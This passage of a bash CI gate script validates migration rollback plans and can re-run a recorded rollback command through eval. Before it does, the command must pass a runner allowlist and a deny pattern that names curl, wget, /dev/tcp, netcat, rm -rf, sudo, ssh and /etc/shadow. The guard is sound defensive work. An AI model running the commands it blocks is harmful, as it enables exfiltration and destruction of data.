  echo "zero-downtime-cutover-gate: FAIL - rollback_proof stale (ran_ts $ran_ts) -> $REPORT" >&2
  exit 2
fi

# HARD: every migration must be reversible==true with a down_command, OR carry a signed
# expand-contract justification ref that EXISTS, is in-repo, and is non-empty.
bad_migrations="$(jq -r '
  (.migrations // [])
  | to_entries[]
  | .key as $i
  | .value
  | select(
      ((.reversible | type) != "boolean")
      or ((.id | type) != "string" or (.id | length) == 0)
      or ((.reversible == true) and ((.down_command | type) != "string" or (.down_command | length) == 0))
      or ((.reversible != true)
          and ((.expand_contract_justification_ref // "") | type != "string" or length == 0))
    )
  | (.id // ("index_" + ($i|tostring)))
' "$PLAN" 2>/dev/null | paste -sd ', ' -)"
if [ -n "$bad_migrations" ]; then
  details="$(printf '%s' "$bad_migrations" | jq -R 'split(", ") | {invalid_or_unsigned_migrations:.}')"
  write_report "FAIL" "every migration must be reversible (with down_command) OR carry a signed expand_contract_justification_ref: $bad_migrations" "$details"
  echo "zero-downtime-cutover-gate: FAIL - invalid/unsigned non-reversible migration(s): $bad_migrations -> $REPORT" >&2
  exit 2
fi

# Any expand_contract_justification_ref present must resolve to a real, in-repo, non-empty file.
just_refs="$(jq -r '(.migrations // [])[] | .expand_contract_justification_ref // empty' "$PLAN" 2>/dev/null)"
missing_refs=""
unsafe_refs=""
while IFS= read -r ref; do
  [ -n "$ref" ] || continue
  case "$ref" in
    /*|*..*) unsafe_refs="${unsafe_refs}${ref}
"; continue ;;
  esac
  if [ ! -s "$ROOT/$ref" ]; then
    missing_refs="${missing_refs}${ref}
"
  fi
done <<EOF
$just_refs
EOF
if [ -n "$unsafe_refs" ]; then
  details="$(printf '%s\n' "$unsafe_refs" | jq -R -s 'split("\n") | map(select(length > 0)) | {unsafe_refs:.}')"
  write_report "FAIL" "expand_contract_justification_ref has unsafe path(s)" "$details"
  echo "zero-downtime-cutover-gate: FAIL - unsafe justification ref(s) -> $REPORT" >&2
  exit 2
fi
if [ -n "$missing_refs" ]; then
  details="$(printf '%s\n' "$missing_refs" | jq -R -s 'split("\n") | map(select(length > 0)) | {missing_or_empty_refs:.}')"
  write_report "FAIL" "expand_contract_justification_ref file(s) missing or empty" "$details"
  echo "zero-downtime-cutover-gate: FAIL - missing/empty justification ref(s) -> $REPORT" >&2
  exit 2
fi

strategy="$(jq -r '.strategy' "$PLAN")"

# ── EXECUTE PROBE — OBSERVE the rollback by RE-RUNNING the recorded command ──────────────────────────
# Copied idiom from authz-tenant-gate.sh: with WALTEUR_CUTOVER_EXEC=1 the recorded rollback_proof.command
# is RE-RUN here through the SAME allowlisted-runner + dangerous-token guard, and its exit is OBSERVED.
# A trivial/constant command (true, :, bash -c 'exit 0', etc.) is REJECTED — it proves nothing. On a
# non-zero exit the rollback did not reproduce => FAIL. Sets marker cutover_probe_executed=true so the
# execution-ratio meta-gate counts a real observation. Without the flag this remains PROTOCOL.
probe_cmd="$(jq -r '.rollback_proof.command // ""' "$PLAN" 2>/dev/null)"
probe_expect=0
if [ "${WALTEUR_CUTOVER_EXEC:-0}" = "1" ]; then
  if [ -z "$probe_cmd" ]; then
    write_report "FAIL" "WALTEUR_CUTOVER_EXEC=1: rollback_proof.command required to OBSERVE the rollback"
    echo "zero-downtime-cutover-gate: FAIL - EXEC mode requires rollback_proof.command -> $REPORT" >&2
    exit 2
  fi

  # Reject a TRIVIAL no-op probe — a constant that passes by doing nothing proves no rollback.
  # Scope (honest): the gate rejects the decidable bare/wrapped no-op constants; that an arbitrary
  # command truly performs the rollback is undecidable here — that is negative-control discipline's job.
  probe_trim="$(printf '%s' "$probe_cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"

  # AUTHORITATIVE no-op / constant-exit check — the shared probe-proof guard. Per-gate regex only blocked
  # the literal `bash -c 'exit 0'` and was bypassed by `bash -lc 'exit 0'`, a trailing `;`, a comment, or a
  # node/python no-op body. probe_proves_something() closes the whole CLASS: the probe must invoke a real
  # test runner OR name a token that resolves to a real on-disk file/dir, else it proves nothing.
  # FAIL CLOSED: if the guard file was absent at source time (PROBE_GUARD=0), refuse rather than skip.
  if [ "$PROBE_GUARD" != "1" ]; then
    write_report "FAIL" "shared probe-proof guard (_probe-proof.sh) unavailable — cannot verify the rollback probe proves a control; failing closed in EXEC mode"
    echo "zero-downtime-cutover-gate: FAIL - probe-proof guard unavailable, failing closed -> $REPORT" >&2
    exit 2
  fi
  if ! probe_proves_something "$probe_trim"; then
    write_report "FAIL" "rollback_proof.command references no real test artifact/runner — it cannot prove the control (no-op/constant probe)"
    echo "zero-downtime-cutover-gate: FAIL - unprovable/no-op probe -> $REPORT" >&2
    exit 2
  fi

  # Pre-existing bare-constant fast-reject — redundant now that the shared guard is authoritative, kept
  # as a harmless explicit backstop for the most common literals.
  case "$probe_trim" in
    true|false|:|/bin/true|/usr/bin/true|/bin/false|/usr/bin/false \
    |"bash -c 'exit 0'"|'bash -c "exit 0"'|"bash -c 'exit 1'"|'bash -c "exit 1"' \
    |"sh -c 'exit 0'"|'sh -c "exit 0"'|"bash -c true"|"sh -c true"|"bash -c :"|"sh -c :")
      write_report "FAIL" "rollback_proof.command is a trivial no-op ($probe_trim) — it must re-run a REAL rollback, not a constant that passes by doing nothing"
      echo "zero-downtime-cutover-gate: FAIL - trivial no-op rollback command ($probe_trim) -> $REPORT" >&2
      exit 2 ;;
  esac

  # Allowlisted runner guard (same first-token allowlist family as authz-tenant-gate, extended with the
  # deploy/cutover runners a real rollback uses: kubectl/helm/terraform/docker/flyctl/etc.).
  probe_first="$(printf '%s' "$probe_cmd" | awk '{print $1}')"
  case "$probe_first" in
    npm|pnpm|yarn|npx|node|deno|bun|python|python3|pytest|tox|uv|go|cargo|make|just|task|bash|sh|jest|vitest|mocha|rspec|rake|phpunit|composer|dotnet|mvn|gradle|./gradlew|ctest|cmake \
    |kubectl|helm|helmfile|terraform|tofu|docker|docker-compose|nomad|flyctl|fly|aws|gcloud|az|kustomize|argocd|skaffold|dbmate|alembic|flyway|liquibase|migrate) : ;;
    *) write_report "FAIL" "rollback_proof.command runner '$probe_first' is not an allowlisted runner (injection guard)"
       echo "zero-downtime-cutover-gate: FAIL - non-allowlisted runner '$probe_first' -> $REPORT" >&2
       exit 2 ;;
  esac

  # Dangerous-token guard (identical token set to authz-tenant-gate): refuse anything that could exfil,
  # destroy, escalate, or chain a side command. Never run on a match.
  if printf '%s' "$probe_cmd" | grep -Eqi 'curl|wget|/dev/tcp|base64|netcat|ncat|rm[[:space:]]+-rf|sudo|mkfs|[[:space:]]dd[[:space:]]|ssh[[:space:]]|scp[[:space:]]|\$\(|`|/etc/(passwd|shadow)'; then
    write_report "FAIL" "rollback_proof.command contains a dangerous token; refusing to run"
    echo "zero-downtime-cutover-gate: FAIL - dangerous token in rollback command -> $REPORT" >&2
    exit 2
  fi

  ( cd "$ROOT" && eval "$probe_cmd" >/dev/null 2>&1 ); probe_rc=$?
  if [ "$probe_rc" != "$probe_expect" ]; then
    details="$(jq -n --arg c "$probe_cmd" --argjson got "$probe_rc" --argjson want "$probe_expect" '{probe:$c, observed_exit:$got, expected:$want}')"
    write_report "FAIL" "rollback probe EXECUTED and did NOT reproduce (exit $probe_rc != expected 0)" "$details"
    echo "zero-downtime-cutover-gate: FAIL - rollback probe executed, exit $probe_rc != 0 -> $REPORT" >&2
    exit 2
  fi
  jq -n --arg v "PASS" --arg ts "$TS" --arg plan "${PLAN#"$ROOT"/}" --arg s "$strategy" --arg rts "$ran_ts" --arg c "$probe_cmd" \
    '{verdict:$v, ts:$ts, gate:"zero-downtime-cutover-gate", plan_file:$plan, reason:"cutover plan valid + rollback OBSERVED by re-executing recorded command", mode:"HARD-EXEC", strategy:$s, rollback_proof_ran_ts:$rts, cutover_probe_executed:true, probe_command:$c, observed_exit:0}' \
    > "$REPORT" 2>/dev/null || write_report "PASS" "cutover plan valid + rollback OBSERVED by re-executing recorded command" "$(jq -n '{cutover_probe_executed:true, observed_exit:0}')"
  echo "zero-downtime-cutover-gate: PASS — rollback OBSERVED by re-executing '$probe_cmd' (exit 0) -> $REPORT" >&2
  exit 0
fi

# ── PROTOCOL pass — shape + freshness checked; rollback correctness ATTESTED, not observed ───────────
details="$(jq -n --arg s "$strategy" --arg rts "$ran_ts" '{mode:"PROTOCOL", strategy:$s, rollback_proof_ran_ts:$rts, cutover_probe_executed:false}')"
write_report "PASS" "cutover plan valid (strategy + proven-rollback shape + fresh ran_ts); rollback correctness ATTESTED not observed — arm WALTEUR_CUTOVER_EXEC=1 to OBSERVE" "$details"
echo "zero-downtime-cutover-gate: PASS (PROTOCOL) - cutover plan valid, strategy=$strategy, rollback ran_ts=$ran_ts -> $REPORT" >&2
exit 0
